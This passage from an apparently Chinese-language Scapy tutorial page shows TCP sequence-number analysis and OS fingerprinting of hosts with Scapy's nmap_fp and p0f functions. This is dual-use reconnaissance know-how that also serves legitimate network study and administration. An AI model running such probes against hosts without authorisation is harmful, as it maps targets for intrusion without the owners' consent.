1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt;&gt;&gt; temp = 0</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt;&gt;&gt; for s, r in ans: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">... &nbsp; &nbsp; temp = r[TCP].seq - temp </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">... &nbsp; &nbsp; print("%d\t+%d" % (r[TCP].seq, temp)) </span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 99px;"></div><div class="CodeMirror-gutters" style="display: none; height: 99px;"></div></div></div></pre></li></ul></li><li><p><span>nmap_fp</span></p><ul><li><p><span>Scapy支持Nmap指纹识别(Nmap在4.20之前完成的旧的“第一代”指纹识别). 在Scapy v2中, 你必须先加载一个扩展模块:</span></p><ul><li><code>&gt;&gt;&gt; load_module(&quot;nmap&quot;)</code></li></ul></li><li><p><span>如果你已经安装了Nmap, 你可以使用它的活动操作系统指纹数据库与Scapy. 确保签名数据库的版本1位于以下指定的路径:</span></p><ul><li><code>&gt;&gt;&gt; conf.nmap_base</code></li></ul></li><li><p><span>然后你可以使用nmap_fp()函数实现与Nmap的OS检测引擎相同的探测:</span></p><ul><li><code>&gt;&gt;&gt; nmap_fp(&quot;192.168.1.1&quot;,oport=443,cport=1)</code></li></ul></li></ul></li><li><p><span>p0f</span></p><ul><li><p><span>如果系统上安装了p0f, 就可以使用它从Scapy猜测操作系统的名称和版本(只使用SYN数据库). 首先, 确保p0f数据库存在于指定的路径</span></p><ul><li><code>&gt;&gt;&gt; conf.p0f_base</code></li></ul></li><li><p><span>例如, 从一个捕获的包猜测操作系统</span></p><ul><li><code>&gt;&gt;&gt; sniff(prn=prnp0f)</code></li></ul></li></ul></li></ul><p>&nbsp;</p></div></div>
</body>
</html>